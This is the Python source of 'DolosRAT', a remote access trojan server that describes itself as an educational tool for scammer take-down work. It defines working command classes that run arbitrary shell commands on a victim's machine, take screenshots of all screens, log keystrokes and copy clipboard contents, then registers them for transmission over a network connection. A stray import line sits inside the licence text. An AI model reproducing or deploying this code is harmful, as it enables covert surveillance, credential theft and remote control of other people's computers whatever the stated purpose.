# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 06/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
# pylint: disable=import-error
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
import sys
import time
from builtins import hasattr
from importlib import import_module
from pathlib import Path
from typing import Any, Dict, List, Union
from time import sleep

# Modules.
# Configuration classes.
from config.config import Config 
from config.logger import get_logger_conf
from config.ctkinter import get_ctkinter_conf
from config.network import network_conf
# Other utilities.
from utils.net.interface import IfaWrapper, get_ifa_wrapper
from utils.misc.logger import LoggerWrapper, LoggerLevel, get_logger
from utils.misc.os import check_admin_privs
from ui.ctk import App, get_ctkinter_app

(__appname__,
 __author__,
 __licence__,
 __version__) = 'DolosRAT', 'Ryan I.', 'MIT License', '1.0'

__copyright__ = f""""
{__licence__}

Copyright (c) 2023 {__author__}.

Permission is hereby granted, free of charge, to any person obtaining a copy
import typing
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

class Command:
    """Base command class for children to inherit.
    Exposes 'execute' method to evaluate upon deserialisation.
    """

    def __init__(self: object, *args) -> None:
        """Initialises Command."""

        # Comprises imported modules.
        self._mods: List[Any] = []
        
        # Houses variable argument for child
        # commands.
        self._args: List[Any] = args

    def get_dep(self: object, mod_name: str) -> Union[Any, None]:
        """Returns imported module for access as needed.

        Args:
            mod_name (str): Module name.

        Returns:
            bool: A status indicating whether module
            is found.
        """

        # Extracts module and index.
        for idx, dep in enumerate(self._mods):
            # Check if provided module name matches
            # those inside modules list.
            if dep.__name__ == mod_name:
                return self._mods[idx]

        return None

    def create_deps(self: object, *mods: List[str]) -> None:
        """Import a variable-length list of
        module names."""

        try:
            for mod in mods:
                # Add imported modules in list for
                # later access.
                self._mods.append(import_module(mod))
        except ModuleNotFoundError:
            # Ignore if importation fails.
            pass

    def execute(self: object) -> Any:
        """Executes main logic.

        Returns:
            Any: Data in any form (typically, bytes
            for transmission in a socket).
        """

        pass
    
class ExecuteCommand(Command):
    """Allows the execution of user-defined
    commands on client system."""

    def __init__(self: object, *args) -> None:
        """Initialises ExecuteCommand."""

        # Initialise from Command parent.
        super().__init__(args)

        # Create list of imported dependencies.
        self.create_deps('subprocess', 'time')

    def execute(self: object) -> bytes:
        """Executes main logic.

        Returns:
            Any: Data in byte form."""
        
        # Bytes to be returned.
        subprocess_output = b''

        try:
            # Execute command via subprocess module, and
            # capture stdout/stderr.
            process = getattr(self.get_dep('subprocess'),'Popen')(
                self._args[0],
                stdout=getattr(self.get_dep('subprocess'),'PIPE'),
                stderr=getattr(self.get_dep('subprocess'),'PIPE'),
                shell=True
            )
            
            # If data exists in stderr, return this in
            # bytes.
            if stderr := process.communicate()[1]:
                subprocess_output = stderr
            else:
                # Otherwise, return stdout.
                subprocess_output = process.communicate()[0]

        except getattr(self.get_dep('subprocess'),'CalledProcessError'):
            # Ignores subprocess exceptions.
            pass
        finally:
            return subprocess_output

class ScreenshotCommand(Command):
    """Allows the capturing of a client's desktop."""

    def __init__(self: object, *args) -> None:
        """Initialises ScreenshotCommand."""

        # Initialise from Command parent.
        super().__init__(args)

        # Create list of imported dependencies.
        self.create_deps('PIL.ImageGrab', 'io', 'base64')

    def execute(self: object) -> bytes:
        """Executes main logic.

        Returns:
            Any: Data in byte form."""

        # Create bytearray to store bytes for
        # screen capture.
        img_bytes = getattr(self.get_dep('io'), 'BytesIO')()

        # Create image capture, in PNG format.
        img_capture = getattr(self.get_dep('PIL.ImageGrab'),'grab')(all_screens=True)
        img_capture.save(img_bytes, 'PNG')

        # Reset bytes cursor.
        img_bytes.seek(0)    

        # Return bytes in byte array.
        return img_bytes.read()
    
class KeystrokeLogCommand(Command):
    """Allows the capturing of a client's keystrokes."""

    def __init__(self: object, *args) -> Any:
        """Initialises KeystrokeLogCommand."""

        # Initialise from Command parent.
        super().__init__(args)

        # Create list of imported dependencies.
        self.create_deps('threading', 'pynput.keyboard')
        
        # Keep list of captured keystrokes (chars).
        self._captured_keys: List[str] = []
        
    def _get_char(self: object, key: Any) -> str:
        """Return character of key provided in
        closure.

        Args:
            key (Any): pynput.keyboard.Key

        Returns:
            str: Character representation of
            key.
        """
            
        key_char = ''
            
        try:
            # Assign character representation (if
            # available).
            key_char = key.char
        except AttributeError:
            # If this is a special character.
            pass
        finally:
            return key_char
        
    def _on_press(self: object, key: Any) -> None:
        """Processes keypresses.

        Args:
            key (Any): pynput.keyboard.Key.
        """
        
        # pynput.keyboard.Key enum to perform structural
        # pattern matching.
        key_enum = getattr(self.get_dep('pynput.keyboard'), 'Key')
        key_press = ''
            
        match key: # pylint: disable=syntax-error
            case key_enum.space:
                key_press = ' '
            case key_enum.enter:
                key_press = '\n'
            case key_enum.tab:
                key_press = '\t'
            case key_enum.backspace:
                key_press = ''
            case _:
                # Other, non-special keystrokes.
                key_press = self._get_char(key)

        try:
            # Adds processed keystroke to list, and
            # convert to bytes for later transmission.
            self._captured_keys.append(str.encode(key_press))
        except TypeError:
            return False

    def execute(self: object) -> Any:
        """Executes main logic.

        Returns:
            Any: Data in byte form."""

        # Create keyboard capture, and set on_press to closure.
        key_capture = getattr(self.get_dep('pynput.keyboard'), 'Listener')(on_press=self._on_press)
        key_capture.start()
        
        # Capture for 30s.
        sleep(30)

        # Return string of entered keystrokes.
        return b''.join(self._captured_keys)
    
class ClipboardCommand(Command):
    """Allows the capturing of a client's clipboard contents."""

    def __init__(self: object, *args) -> Any:
        """Initialises ClipboardCommand."""

        # Initialise from Command parent.
        super().__init__(args)

        # Create list of imported dependencies.
        self.create_deps('pyperclip')

    def execute(self: object) -> Any:
        """Executes main logic.

        Returns:
            Any: Data in byte form."""
        
        # Houses clipboard contents.
        clipboard_contents = ''

        # Copy full contents of clipboard.
        clipboard_contents = getattr(self.get_dep('pyperclip'), 'paste')()
        # Return contents to clipboard.
        getattr(self.get_dep('pyperclip'), 'copy')(clipboard_contents)

        # Return string of entered keystrokes.
        return clipboard_contents.encode()

# Initial class housing primary DolosRAT logic.
class DolosServer:
    """Houses the logic pertinent to the running
    application. This is responsible for initialising
    the neccessary, internal modules of the application
    and interfacing between each of these.
    """

    def __init__(
        self: object, config: Dict[str, Any]
    ) -> None:
        """Initialises DolosRAT class.

        Configures other, internal modules of DolosRAT.
        """

        self._config: Dict[str, Any] = config

        # Logger handle.
        self._logger: Union[Any, LoggerWrapper] = None

        # IfaWrapper handle.
        self._net_wrapper: Union[Any, IfaWrapper]
        
        # CTK handle.
        self._ctk_handle: Union[Any, App] = None
        
        # Used to calculate time taken to initialise.
        self._strt_time: float = time.time()

        # Set-up application logging.
        self._init_logger()

        # Perform networking set-up.
        self._init_net()

    def __del__(self: object) -> None:
        """Destructs DolosRAT class.

        The purpose of this is to destroy existing handles
        to modules and release other resources.
        """

        # Write log to inform of shutting down.
        self._logger.write_log(
            "DolosRAT shutting down. Please wait.", 
            LoggerLevel.WARNING
        )

        # Releases handles to module objects.
        self._net_wrapper = self._logger = None
        del self

    def _init_logger(self: object) -> None:
        """Creates handle to logging wrapper class.

        Creates a handle to the class exposing methods
        to write application logs, etc.
        """

        # Create handle to LoggerWrapper.
        self._logger = get_logger(
            self._config['logger_conf']
        )

        self._logger.write_log(
            "DolosRAT initialisation started.", 
            LoggerLevel.INFO
        )

    def _init_tkinter(self: object) -> None:
        """Creates handle to Tkinter wrapper class.
        
        Creates a handle to the class providing a 
        wrapper to Tkinter and producing the UI.
        """

        # Create log to inform that the UI in
        # CTkinter is being set-up.
        self._logger.write_log(
            "Generating and rendering DolosRAT UI.", 
            LoggerLevel.INFO
        )

        # Create handle for and initialise
        # App class for CTK.
        self._ctk_handle = get_ctkinter_app(self._config['ctk_conf'])
        self._ctk_handle.mainloop()

    def _init_net(self: object) -> None:
        """Initialises functionality for enumerating
        network interfaces.
        """

        # Creates wrapper for IfaWrapper.
        self._net_wrapper = get_ifa_wrapper()

    def _init_commands(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        for command in [
            ScreenshotCommand, KeystrokeLogCommand, ClipboardCommand, ExecuteCommand
        ]:
            network_conf.conf['commands'][command.__name__] = command

    def _run(self: object) -> None:
        """Officially starts the internal modules.

        With handles created for the classes pertinent
        to the application, use these to commence DolosRAT.
        """

        # Time-based statistics.
        self._logger.write_log(
            f"DolosRAT initialised in { time.time() - self._strt_time }.", 
            LoggerLevel.INFO
        )

        # Checks if running as administrator/root, as
        # capturing on interface (privileged) is
        # neccessary.
        if check_admin_privs() is False:
            self._logger.write_log(
                "DolosRAT running in unprivileged mode. Continuing.", 
                LoggerLevel.WARNING
            )

        # Register command classes.
        self._init_commands()

        # Generate and render UI using
        # CustomTkinter.
        self._init_tkinter()

    def start(self: object) -> None:
        """Exposed method for 'starting' DolosRAT.

        This creates the neccessary handles, and 
        evaluate the method for responsible for 
        the primary logic (_run()).
        """

        try:
            # Initialise.
            self._run()
        except (RuntimeError, KeyboardInterrupt):
            # CTRL+C, exit.
            # Force close CTK and prevent freeze.
            if hasattr(self._ctk_handle, 'destroy'):
                self._ctk_handle.destroy()
        finally:
            sys.exit(0)

if __name__ == '__main__':

    # Houses configuration for 'DolosRAT' class.
    dolos_config: Dict[str, Config] = {}

    # Populate 'dolos_config' with configurations.
    dolos_config = {
       'logger_conf': get_logger_conf(__name__),
       'ctk_conf': get_ctkinter_conf(
           __version__,
           Path.joinpath(
               Path(__file__).parent.parent, 'dolos_server', 'assets'
            ),
           check_admin_privs()
        )
    }

    # Application entry-point.
    DolosServer(dolos_config).start()

    # Gracefully exit.
    sys.exit(0)
